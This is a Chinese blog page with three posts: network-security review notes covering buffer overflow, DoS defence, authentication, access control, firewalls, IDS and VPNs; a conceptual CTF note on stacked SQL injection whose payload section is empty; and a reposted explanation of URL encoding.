<p>注：堆栈的内存地址增长方向（堆向着内存地址增加的方向增长；栈向着内存地址降低的方向增长）</p>
<p><img src="https://img-blog.csdnimg.cn/20191210125936903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="变量在内存的存放区域"></p>
<h3 id="8-2-缓冲区溢出"><a href="#8-2-缓冲区溢出" class="headerlink" title="8.2 缓冲区溢出"></a>8.2 缓冲区溢出</h3><ul>
<li>栈溢出</li>
<li>格式化字符串溢出</li>
<li>整数溢出</li>
<li>堆溢出</li>
</ul>
<h3 id="8-3-缓冲区溢出攻击的防御"><a href="#8-3-缓冲区溢出攻击的防御" class="headerlink" title="8.3 缓冲区溢出攻击的防御"></a>8.3 缓冲区溢出攻击的防御</h3><ol>
<li>在系统管理上的防范策略<br>（1）关闭不需要的特权程序<br>（2）及时给程序漏洞打补丁</li>
<li>在软件开发过程中的防范策略<br>（1）编写正确的代码<br>（2）缓冲区不可执行<br>（3）改进C语言函数库<br>（4）数组边界检测<br>（5）程序指针完整性检查</li>
</ol>
<h2 id="9-恶意代码防护技术"><a href="#9-恶意代码防护技术" class="headerlink" title="9 恶意代码防护技术"></a>9 恶意代码防护技术</h2><h2 id="10-拒绝服务攻击与防御"><a href="#10-拒绝服务攻击与防御" class="headerlink" title="10 拒绝服务攻击与防御"></a>10 拒绝服务攻击与防御</h2><h3 id="10-1-拒绝服务攻击的定义"><a href="#10-1-拒绝服务攻击的定义" class="headerlink" title="10.1 拒绝服务攻击的定义"></a>10.1 拒绝服务攻击的定义</h3><p>拒绝服务DoS（Denial of Service）是一种典型的破坏性攻击，它不以获得系统访问权限为目的。其通常利用传输协议弱点、系统漏洞、服务漏洞对目标系统发起大规模进攻，用超出目标处理能力的海量数据包消耗可用系统资源、带宽资源等，或造成程序缓冲区溢出错误，致使其无法处理合法用户的请求，无法提供正常服务，最终致使网络服务瘫痪，甚至系统死机。</p>
<h3 id="10-2-拒绝服务攻击的分类"><a href="#10-2-拒绝服务攻击的分类" class="headerlink" title="10.2 拒绝服务攻击的分类"></a>10.2 拒绝服务攻击的分类</h3><ol>
<li>资源消耗（可以消耗的资源包括目标系统的网络带宽、CPU资源、内存资源和存储资源等）</li>
<li>系统或应用程序缺陷（Ping致死、Land攻击、smurf攻击、IP分片攻击、UDP泛洪、SYN泛洪、ACK泛洪）</li>
<li>配置修改（修改系统的运行配置，导致网络系统不能正常提供服务）</li>
</ol>
<h3 id="10-3-分布式拒绝服务攻击DDoS"><a href="#10-3-分布式拒绝服务攻击DDoS" class="headerlink" title="10.3 分布式拒绝服务攻击DDoS"></a>10.3 分布式拒绝服务攻击DDoS</h3><p>DDoS攻击程序一般由3个分布组成：客户端、服务端和守护程序。<br>这些程序可以完成对分散在各地的计算机的协调工作并完成对目标系统的攻击。</p>
<h3 id="10-4-DoS-x2F-DDoS攻击的检测与防御"><a href="#10-4-DoS-x2F-DDoS攻击的检测与防御" class="headerlink" title="10.4 DoS&#x2F;DDoS攻击的检测与防御"></a>10.4 DoS&#x2F;DDoS攻击的检测与防御</h3><h4 id="10-4-1-检测"><a href="#10-4-1-检测" class="headerlink" title="10.4.1 检测"></a>10.4.1 检测</h4><ol>
<li>出现大量的DNS PTR查询请求</li>
<li>超出网络正常工作时的极限通讯流量</li>
<li>特大型的ICMP和UDP数据包</li>
<li>不属于正常连接通讯的TCP和UDP数据包</li>
<li>数据段内容只包含文字和数字字符（例如，没有空格、标点和控制字符）</li>
</ol>
<h4 id="10-4-2-防御"><a href="#10-4-2-防御" class="headerlink" title="10.4.2 防御"></a>10.4.2 防御</h4><ol>
<li>进行合理的带宽限制</li>
<li>运行尽可能少的服务，只允许必要的通信</li>
<li>及时安装系统补丁</li>
<li>封锁恶意IP地址</li>
<li>增强系统用户的安全意识，避免成为傀儡主机</li>
<li>建立健全的DoS&#x2F;DDoS攻击的应急响应机制</li>
</ol>
<h2 id="11-身份鉴别与认证"><a href="#11-身份鉴别与认证" class="headerlink" title="11 身份鉴别与认证"></a>11 身份鉴别与认证</h2><h3 id="11-1-身份鉴别与认证概述"><a href="#11-1-身份鉴别与认证概述" class="headerlink" title="11.1 身份鉴别与认证概述"></a>11.1 身份鉴别与认证概述</h3><p>身份认证分为单向认证和双向认证。</p>
<h3 id="11-2-认证鉴别机制"><a href="#11-2-认证鉴别机制" class="headerlink" title="11.2 认证鉴别机制"></a>11.2 认证鉴别机制</h3><h4 id="11-2-1-基于口令的认证"><a href="#11-2-1-基于口令的认证" class="headerlink" title="11.2.1 基于口令的认证"></a>11.2.1 基于口令的认证</h4><p>11.2.1.1 基于单向哈希函数</p>
<p>单纯的进行哈希函数运算不能抵抗重放攻击，当前主流做法是结合挑战&#x2F;响应（Challenge&#x2F;Response机制）。认证机制为：客户端计算该口令的哈希函数值后保存并删除明文口令值，然后向认证服务器提出认证请求。认证服务器收到请求后通过伪随机数生成器产生一个随机数并将其作为挑战发给客户端。客户端使用口令的哈希值作为密钥，并通过指定的加密算法对挑战进行加密，得到密文作为应答发送给认证服务器。认证服务器读取初始化过程中存储的口令哈希值，并通过同样的密码算法对应答进行解密得到挑战。如果解密得到的挑战与开始产生的挑战相同，则认证通过，否则认证失败。</p>
<p><img src="https://img-blog.csdnimg.cn/20191207172531843.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="基于哈希函数和挑战/响应的身份认证过程"></p>
<p>口令修改过程：首先输入旧口令，系统计算旧口令的哈希函数值。然后要求用户输入新口令，当用户输入新口令后，系统计算新口令的哈希函数值，并以旧口令的哈希函数值作为秘钥，使用认证过程相同的加密算法加密新口令的哈希函数值，得到的结果通过公共信道传输给认证服务器。认证服务器从数据库中读取旧口令的哈希值并用其作为秘钥解密得到新口令的哈希值。</p>
<p><img src="https://img-blog.csdnimg.cn/20191207172712135.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="基于挑战/响应的认证机制的口令修改过程"></p>
<p>单纯的进行哈希函数运算不能抵抗重放攻击，通过挑战&#x2F;响应机制可以抵抗重放攻击</p>
<p>11.2.1.2 加盐口令</p>
<p>攻击者获得存储口令单向哈希值的文件，字典攻击有效，但是加盐（盐就是一个随机字符串）可使字典攻击更加困难。<br>盐（Salt）只能防止对整个口令文件采用的字典攻击，不能防止对单个口令的字典攻击，此方法也不能抵抗重放攻击。</p>
<p>11.2.1.3 SKEY机制</p>
<p>随机数为R，x(1)&#x3D;f(R)，x(2)&#x3D;f(x(1))，x(3)&#x3D;f(x(2))，…，x(n+1)&#x3D;f(x(n))</p>
<p>11.2.1.4 EKE协议</p>
<p>在EKE协议中，两个用户执行Diffie-Hellman秘钥交换协议的加密版本，该协议可以抵抗字典攻击。</p>
<h4 id="11-2-2-基于密码学的认证"><a href="#11-2-2-基于密码学的认证" class="headerlink" title="11.2.2 基于密码学的认证"></a>11.2.2 基于密码学的认证</h4><h4 id="11-2-3-基于生物特征的认证"><a href="#11-2-3-基于生物特征的认证" class="headerlink" title="11.2.3 基于生物特征的认证"></a>11.2.3 基于生物特征的认证</h4><h3 id="11-3-典型认证技术"><a href="#11-3-典型认证技术" class="headerlink" title="11.3 典型认证技术"></a>11.3 典型认证技术</h3><h4 id="11-3-1-Kerberos认证协议"><a href="#11-3-1-Kerberos认证协议" class="headerlink" title="11.3.1 Kerberos认证协议"></a>11.3.1 Kerberos认证协议</h4><h4 id="11-3-2-公钥基础设施PKI"><a href="#11-3-2-公钥基础设施PKI" class="headerlink" title="11.3.2 公钥基础设施PKI"></a>11.3.2 公钥基础设施PKI</h4><h2 id="12-访问控制"><a href="#12-访问控制" class="headerlink" title="12 访问控制"></a>12 访问控制</h2><h3 id="12-1-访问控制的基本概念"><a href="#12-1-访问控制的基本概念" class="headerlink" title="12.1 访问控制的基本概念"></a>12.1 访问控制的基本概念</h3><p>访问控制（Access Control）就是在身份认证的基础上，依据授权对提出的资源访问请求加以控制。</p>
<h3 id="12-2-访问控制矩阵"><a href="#12-2-访问控制矩阵" class="headerlink" title="12.2 访问控制矩阵"></a>12.2 访问控制矩阵</h3><p>主体、客体、访问权限</p>
<h3 id="12-3-典型的访问控制策略模型"><a href="#12-3-典型的访问控制策略模型" class="headerlink" title="12.3 典型的访问控制策略模型"></a>12.3 典型的访问控制策略模型</h3><ol>
<li>自主访问控制（Discretionary Access Control，DAC）</li>
<li>强制访问控制（Mandatory Access Conntrol，MAC）</li>
<li>基于角色的访问控制（Role-Based Access Control，RBAC）</li>
<li>基于属性的访问控制（Attribute-Based Access Control，ABAC）</li>
</ol>
<h3 id="12-4-计算机安全形式化模型与多级安全"><a href="#12-4-计算机安全形式化模型与多级安全" class="headerlink" title="12.4 计算机安全形式化模型与多级安全"></a>12.4 计算机安全形式化模型与多级安全</h3><h4 id="12-4-1-Bell-Lapadula模型"><a href="#12-4-1-Bell-Lapadula模型" class="headerlink" title="12.4.1 Bell-Lapadula模型"></a>12.4.1 Bell-Lapadula模型</h4><p>不上读，不下写</p>
<h4 id="12-4-2-Biba模型"><a href="#12-4-2-Biba模型" class="headerlink" title="12.4.2 Biba模型"></a>12.4.2 Biba模型</h4><p>不下读，不上写</p>
<h4 id="12-4-3-多级安全"><a href="#12-4-3-多级安全" class="headerlink" title="12.4.3 多级安全"></a>12.4.3 多级安全</h4><p>公开、受限、秘密、机密、绝密</p>
<h2 id="13-防火墙"><a href="#13-防火墙" class="headerlink" title="13 防火墙"></a>13 防火墙</h2><h3 id="13-1-防火墙概述"><a href="#13-1-防火墙概述" class="headerlink" title="13.1 防火墙概述"></a>13.1 防火墙概述</h3><h4 id="13-1-1-防火墙的概念与功能"><a href="#13-1-1-防火墙的概念与功能" class="headerlink" title="13.1.1 防火墙的概念与功能"></a>13.1.1 防火墙的概念与功能</h4><p>防火墙（Firewall）是一种用来加强网络之间访问控制的特殊网络设备，是一种位于内部网络与外部网络之间的网络安全系统。</p>
<p>防火墙的功能</p>
<ol>
<li>包过滤</li>
<li>审计和报警机制</li>
<li>NAT（网络地址转换）</li>
<li>Proxy（代理）</li>
<li>流量控制（带宽控制）和统计分析、流量计费</li>
<li>上网行为管理</li>
</ol>
<h4 id="13-1-2-防火墙的基本策略"><a href="#13-1-2-防火墙的基本策略" class="headerlink" title="13.1.2 防火墙的基本策略"></a>13.1.2 防火墙的基本策略</h4><ul>
<li>拒绝除明确许可以外的任何一种服务</li>
<li>允许除明确拒绝以外的任何一种服务</li>
</ul>
<h3 id="13-2-防火墙的分类"><a href="#13-2-防火墙的分类" class="headerlink" title="13.2 防火墙的分类"></a>13.2 防火墙的分类</h3><ul>
<li>包过滤防火墙&#x2F;包过滤路由器</li>
<li>代理技术</li>
<li>网络地址转换技术</li>
</ul>
<p>常见的网络服务和使用的端口</p>
<table>
<thead>
<tr>
<th>端口号</th>
<th>端口服务名称</th>
<th>端口说明</th>
</tr>
</thead>
<tbody><tr>
<td>20</td>
<td>ftp-data</td>
<td>FTP数据</td>
</tr>
<tr>
<td>21</td>
<td>ftp</td>
<td>FTP控制</td>
</tr>
<tr>
<td>22</td>
<td>ssh</td>
<td>安全Shell（SSH）服务</td>
</tr>
<tr>
<td>23</td>
<td>telnet</td>
<td>Telnet服务</td>
</tr>
<tr>
<td>25</td>
<td>smtp</td>
<td>简单邮件传输协议（SMTP）</td>
</tr>
<tr>
<td>53</td>
<td>dns</td>
<td>域名服务（如BIND）</td>
</tr>
<tr>
<td>69</td>
<td>tftp</td>
<td>小文件传输协议（TFTP）</td>
</tr>
<tr>
<td>70</td>
<td>gopher</td>
<td>Gopher互联网文档搜寻和检索</td>
</tr>
<tr>
<td>80</td>
<td>http</td>
<td>用于万维网（WWW）服务的超文本传输协议（HTTP）</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
<td>收emailyong</td>
</tr>
<tr>
<td>137</td>
<td>netbios-ns</td>
<td>在红帽企业Linux中被Samba使用的NET BIOS名称服务</td>
</tr>
<tr>
<td>138</td>
<td>netbios-dgm</td>
<td>在红帽企业Linux中被Samba使用的NET BIOS数据报服务</td>
</tr>
<tr>
<td>139</td>
<td>netbios-ssn</td>
<td>在红帽企业Linux中被Samba使用的NET BIOS会话服务</td>
</tr>
<tr>
<td>143</td>
<td>imap</td>
<td>互联网消息存取协议（IMAP）</td>
</tr>
<tr>
<td>161</td>
<td>snmp</td>
<td>简单网络管理协议（SNMP）</td>
</tr>
<tr>
<td>162</td>
<td>snmptrap</td>
<td>SNMP的陷阱</td>
</tr>
<tr>
<td>179</td>
<td>bgp</td>
<td>边界网络协议</td>
</tr>
<tr>
<td>389</td>
<td>ldap</td>
<td>轻型目录存取协议（LDAP）</td>
</tr>
<tr>
<td>443</td>
<td>https</td>
<td>安全超文本传输协议（HTTP）</td>
</tr>
<tr>
<td>520</td>
<td>rip</td>
<td>路由信息协议(RIP)</td>
</tr>
<tr>
<td>546</td>
<td>dhcpv6-client</td>
<td>动态主机配置协议（DHCP）版本6客户</td>
</tr>
<tr>
<td>547</td>
<td>dhcpv6-server</td>
<td>动态主机配置协议（DHCP）版本6服务</td>
</tr>
<tr>
<td>1701</td>
<td>l2tp [l2f]</td>
<td>第2层隧道服务（LT2P）&#x2F;第2层转发（L2F）</td>
</tr>
<tr>
<td>3306</td>
<td>mysql</td>
<td>MySQL数据库服务</td>
</tr>
<tr>
<td>3389</td>
<td>rdp</td>
<td>远程桌面协议(终端服务RDP)</td>
</tr>
</tbody></table>
<h3 id="13-3-防火墙的配置方案"><a href="#13-3-防火墙的配置方案" class="headerlink" title="13.3 防火墙的配置方案"></a>13.3 防火墙的配置方案</h3><ul>
<li>屏蔽路由器</li>
<li>双宿主机</li>
<li>屏蔽主机</li>
<li>屏蔽子网</li>
</ul>
<h2 id="14-入侵检测与入侵防御"><a href="#14-入侵检测与入侵防御" class="headerlink" title="14 入侵检测与入侵防御"></a>14 入侵检测与入侵防御</h2><h3 id="14-1-入侵检测的基本概念"><a href="#14-1-入侵检测的基本概念" class="headerlink" title="14.1 入侵检测的基本概念"></a>14.1 入侵检测的基本概念</h3><p>入侵检测系统（Intrusion Detection System，IDS）通过从计算机网络或计算机系统的关键点收集信息并进行分析，从中发现网络或系统中是否有违反安全策略的行为和被攻击的迹象并且对其做出反应。有些反应是自动的，它包括通知网络安全管理员（通过控制台、电子邮件），终止入侵进程、关闭系统、断开与互联网的连接，使该用户无效，或者执行一个准备好的命令等。</p>
<h3 id="14-2-入侵检测系统分类"><a href="#14-2-入侵检测系统分类" class="headerlink" title="14.2 入侵检测系统分类"></a>14.2 入侵检测系统分类</h3><ul>
<li>基于主机的入侵检测系统（HIDS）</li>
<li>基于网络的入侵检测系统（NIDS）</li>
<li>分布式入侵检测系统</li>
</ul>
<h3 id="14-3-入侵检测技术"><a href="#14-3-入侵检测技术" class="headerlink" title="14.3 入侵检测技术"></a>14.3 入侵检测技术</h3><h4 id="14-3-1-异常检测技术"><a href="#14-3-1-异常检测技术" class="headerlink" title="14.3.1 异常检测技术"></a>14.3.1 异常检测技术</h4><h4 id="14-3-2-特征检测技术"><a href="#14-3-2-特征检测技术" class="headerlink" title="14.3.2 特征检测技术"></a>14.3.2 特征检测技术</h4><ol>
<li>URL编码</li>
<li>斜线问题</li>
<li>命令问题</li>
<li>增加目录</li>
<li>不规则方式</li>
<li>虚假的请求结束</li>
<li>长URL</li>
<li>会话组合</li>
<li>大小写敏感</li>
</ol>
<h3 id="14-4-入侵防御系统"><a href="#14-4-入侵防御系统" class="headerlink" title="14.4 入侵防御系统"></a>14.4 入侵防御系统</h3><ul>
<li>基于主机的入侵防御系统（HIPS）</li>
<li>基于网络的入侵防御系统（NIPS）</li>
<li>应用入侵防御系统（AIPS）</li>
</ul>
<h2 id="15-虚拟专用网"><a href="#15-虚拟专用网" class="headerlink" title="15 虚拟专用网"></a>15 虚拟专用网</h2><h3 id="15-1-虚拟专用网概述"><a href="#15-1-虚拟专用网概述" class="headerlink" title="15.1 虚拟专用网概述"></a>15.1 虚拟专用网概述</h3><p>虚拟专用网（Virtual Private Network，VPN）指的是在公用网络上利用加密与访问控制建立专用网络的技术。</p>
<h3 id="15-2-VPN的分类"><a href="#15-2-VPN的分类" class="headerlink" title="15.2 VPN的分类"></a>15.2 VPN的分类</h3><ul>
<li>远程访问VPN</li>
<li>网关-网关VPN</li>
</ul>
<h3 id="15-3-典型的虚拟专用网技术"><a href="#15-3-典型的虚拟专用网技术" class="headerlink" title="15.3 典型的虚拟专用网技术"></a>15.3 典型的虚拟专用网技术</h3><h4 id="15-3-1-第二层隧道协议"><a href="#15-3-1-第二层隧道协议" class="headerlink" title="15.3.1 第二层隧道协议"></a>15.3.1 第二层隧道协议</h4><ul>
<li>点到点隧道协议（Point to Point Tunneling Protocol，PPTP）</li>
<li>第二层隧道协议（Layer Two Tunneling Protocal，L2TP）</li>
<li>第二层转发协议（Layer 2 Forwaring，L2F）</li>
</ul>
<h4 id="15-3-2-第三层隧道协议"><a href="#15-3-2-第三层隧道协议" class="headerlink" title="15.3.2 第三层隧道协议"></a>15.3.2 第三层隧道协议</h4><ul>
<li>IP安全（Internet Protocal Security，IPSec）</li>
</ul>
<h4 id="15-3-3-第四层隧道协议"><a href="#15-3-3-第四层隧道协议" class="headerlink" title="15.3.3 第四层隧道协议"></a>15.3.3 第四层隧道协议</h4><ul>
<li>安全套接字（Secure Sockets Layer，SSL）</li>
<li>传输层安全（Transport Layer Security，TLS）</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/" data-id="cl1qb1dzx007wqktu12vs8myc" data-title="网络安全复习" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-360杯-Web实战-smity_sql堆叠注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/09/360%E6%9D%AF-Web%E5%AE%9E%E6%88%98-smity_sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2019-11-09T15:52:43.000Z" itemprop="datePublished">2019-11-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/09/360%E6%9D%AF-Web%E5%AE%9E%E6%88%98-smity_sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">360杯-Web实战-smity_sql堆叠注入</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="1-目录"><a href="#1-目录" class="headerlink" title="1 目录"></a>1 目录</h1><ol>
<li>堆叠注入</li>
<li>源代码分析</li>
<li>存储过程</li>
<li>payload技巧</li>
</ol>
<h1 id="2-堆叠注入"><a href="#2-堆叠注入" class="headerlink" title="2 堆叠注入"></a>2 堆叠注入</h1><p>Stacked injections：堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在MySQL中，主要是命令行中，每一条语句结尾加分号（;）表示结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。代码中和一般查询不同的是，使用了multi_query函数</p>
<p>在SQL中，分号（;）是用来表示一条SQL语句的结束。试想一下我们在分号（;）结束一个SQL语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别吗？区别就在于union或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p>
<h1 id="3-源码分析"><a href="#3-源码分析" class="headerlink" title="3 源码分析"></a>3 源码分析</h1><p><img src="https://img-blog.csdnimg.cn/20191110010208907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="源码分析"></p>
<h1 id="4-存储过程"><a href="#4-存储过程" class="headerlink" title="4 存储过程"></a>4 存储过程</h1><p>存储过程（Stored Procedure）是一种在数据库中存储复杂程序，以便外部程序调用的一种数据库对象。</p>
<p>存储过程是为了完成特定功能的SQL语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数（需要时）来调用执行。</p>
<p>存储过程思想上很简单，就是数据库SQL语言层面的代码封装与重用，也可以理解为具有名字的一段代码，用来完成一个特定的功能，创建的存储过程保存在数据库的数据字典中。</p>
<p><img src="https://img-blog.csdnimg.cn/20191110010517303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="存储过程"></p>
<h1 id="5-payload技巧"><a href="#5-payload技巧" class="headerlink" title="5 payload技巧"></a>5 payload技巧</h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/09/360%E6%9D%AF-Web%E5%AE%9E%E6%88%98-smity_sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" data-id="cl1qb1dws0006qktu266iaxtg" data-title="360杯-Web实战-smity_sql堆叠注入" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-为什么要进行URL编码（转）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/09/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8CURL%E7%BC%96%E7%A0%81%EF%BC%88%E8%BD%AC%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2019-11-09T09:04:16.000Z" itemprop="datePublished">2019-11-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/09/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8CURL%E7%BC%96%E7%A0%81%EF%BC%88%E8%BD%AC%EF%BC%89/">为什么要进行URL编码（转）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>本文转载于下面这位大佬的博客</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jerrysion/p/5522673.html">https://www.cnblogs.com/jerrysion/p/5522673.html</a></p>
<h1 id="1-为什么要进行URL编码"><a href="#1-为什么要进行URL编码" class="headerlink" title="1 为什么要进行URL编码"></a>1 为什么要进行URL编码</h1><p>  我们都知道Http协议中参数的传输是”key&#x3D;value”这种键值对形式的，如果要传多个参数就需要用“&amp;<br>”符号对键值对进行分割。如”?name1&#x3D;value1&amp;name2&#x3D;value2”，这样在服务端在收到这种字符串的时候，会用“&amp;”分割出每一个参数，然后再用“&#x3D;”来分割出参数值。</p>
<p>  针对“name1&#x3D;value1&amp;name2&#x3D;value2”我们来说一下客户端到服务端的概念上解析过程:<br>上述字符串在计算机中用ASCII码表示为： </p>
<blockquote>
<p>6E616D6531 3D 76616C756531 26 6E616D6532 3D 76616C756532。<br>6E616D6531：name1<br>3D：&#x3D;<br>76616C756531：value1<br>26：&amp;<br>6E616D6532：name2<br>3D：&#x3D;<br>76616C756532：value2 </p>
</blockquote>
<p>服务端在接收到该数据后就可以遍历该字节流，首先一个字节一个字节的吃，当吃到3D这字节后，服务端就知道前面吃<br>的字节表示一个key，再想后吃，如果遇到26，说明从刚才吃的3D到26子节之间的是上一个key的value，以此类推就可以解析出客户端传过来的参数。</p>
<p>  现在有这样一个问题，如果我的参数值中就包含&#x3D;或&amp;这种特殊字符的时候该怎么办。<br>比如说“name1&#x3D;value1”,其中value1的值是“va&amp;lu&#x3D;e1”字符串，那么实际在传输过程中就会变成这样“name1&#x3D;va&amp;lu&#x3D;e1”。我们的本意是就只有一个键值对，但是服务端会解析成两个键值对，这样就产生了奇异。</p>
<h1 id="2-如何解决上述问题带来的歧义呢？解决的办法就是对参数进行URL编码"><a href="#2-如何解决上述问题带来的歧义呢？解决的办法就是对参数进行URL编码" class="headerlink" title="2 如何解决上述问题带来的歧义呢？解决的办法就是对参数进行URL编码"></a>2 如何解决上述问题带来的歧义呢？解决的办法就是对参数进行URL编码</h1><p>URL编码只是简单的在特殊字符的各个字节前加上%，例如，我们对上述会产生奇异的字符进行URL编码后结果：“name1&#x3D;va%26lu%3D”，这样服务端会把紧跟在“%”后的字节当成普通的字节，就是不会把它当成各个参数或键值对的分隔符。</p>
<p>  另外一个问题，就是为什么我们要用ASCII传输，可不可以用别的编码？<br>当然可以用别的编码，你自己可以开发一套编码，然后自己解析。就像大部分国家都有自己的语言一样。那国家之间要交流，怎么办？  用英语把，英语的使用范围最广。</p>
<p>通常如果一样东西需要编码，说明这样东西并不适合传输。原因多种多样，如Size过大，包含隐私数据，对于URL来说，之所以要进行编码，是因为URL中有些字符会引起歧义。</p>
<p>例如，URL参数字符串中使用key&#x3D;value键值对这样的形式来传参，键值对之间以&amp;符号分隔，如&#x2F;s?q&#x3D;abc&amp;ie&#x3D;utf-8。如果你的value字符串中包含了&#x3D;或者&amp;，那么势必会造成接收URL的服务器解析错误，因此必须将引起歧义的&amp;和&#x3D;符号进行转义，也就是对其进行编码。</p>
<p>又如，URL的编码格式采用的是ASCII码，而不是Unicode，这也就是说你不能在URL中包含任何非ASCII字符，例如中文。否则如果客户端浏览器和服务端浏览器支持的字符集不同的情况下，中文可能会造成问题。</p>
<p>URL编码的原则就是使用安全的字符（没有特殊用途或者特殊意义的可打印字符）去表示那些不安全的字符。</p>
<p>预备知识：URI是统一资源标识的意思，通常我们所说的URL只是URI的一种。典型URL的格式如下所示。下面提到的URL编码，实际上应该指的是URI编码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">foo://example.com:8042/over/there?name=ferret#nose</span><br><span class="line"></span><br><span class="line">   \_/ \______________/ \________/\_________/ \__/</span><br><span class="line"></span><br><span class="line">    |         |              |         |        |</span><br><span class="line"></span><br><span class="line">  scheme     authority                path      query   fragment</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="3-哪些字符需要编码"><a href="#3-哪些字符需要编码" class="headerlink" title="3 哪些字符需要编码"></a>3 哪些字符需要编码</h1><p>RFC3986文档规定，URL中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。RFC3986文档对URL的编解码问题做出了详细的建议，指出了哪些字符需要被编码才不会引起URL语义的转变，以及对为什么这些字符需要编码做出了相应的解释。</p>
<p>US-ASCII字符集中没有对应的可打印字符：URL中只允许使用可打印字符。US-ASCII码中的10-7F字节全都表示控制字符，这些字符都不能直接出现在URL中。同时，对于80-FF字节（ISO-8859-1），由于已经超出了US-ASCII定义的字节范围，因此也不可以放在URL中。</p>
<p>　　保留字符：URL可以划分成若干个组件，协议、主机、路径等。有一些字符（:&#x2F;?#[]@）是用作分隔不同组件的。例如：冒号用于分隔协议和主机，&#x2F;用于分隔主机和路径，?用于分隔路径和查询参数，等等。还有一些字符（!$&amp;’()*+,;&#x3D;）用于在每个组件中起到分隔作用的，如&#x3D;用于表示查询参数中的键值对，&amp;符号用于分隔查询多个键值对。当组件中的普通数据包含这些特殊字符时，需要对其进行编码。</p>
<p>RFC3986中指定了以下字符为保留字符：! * ‘ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p>
<p>　　不安全字符：还有一些字符，当他们直接放在URL中的时候，可能会引起解析程序的歧义。这些字符被视为不安全字符，原因有很多。</p>
<ul>
<li>空格：URL在传输的过程，或者用户在排版的过程，或者文本处理程序在处理URL的过程，都有可能引入无关紧要的空格，或者将那些有意义的空格给去掉。</li>
<li>引号以及&lt;&gt;：引号和尖括号通常用于在普通文本中起到分隔URL的作用</li>
<li>#：通常用于表示书签或者锚点</li>
<li>%：百分号本身用作对不安全字符进行编码时使用的特殊字符，因此本身需要编码</li>
<li>{}|^[]&#96;~：某一些网关或者传输代理会篡改这些字符</li>
</ul>
<p>　　需要注意的是，对于URL中的合法字符，编码和不编码是等价的，但是对于上面提到的这些字符，如果不经过编码，那么它们有可能会造成URL语义的不同。因此对于URL而言，只有普通英文字符和数字，特殊字符$-_.+!*’()还有保留字符，才能出现在未经编码的Url之中。其他字符均需要经过编码之后才能出现在URL中。</p>
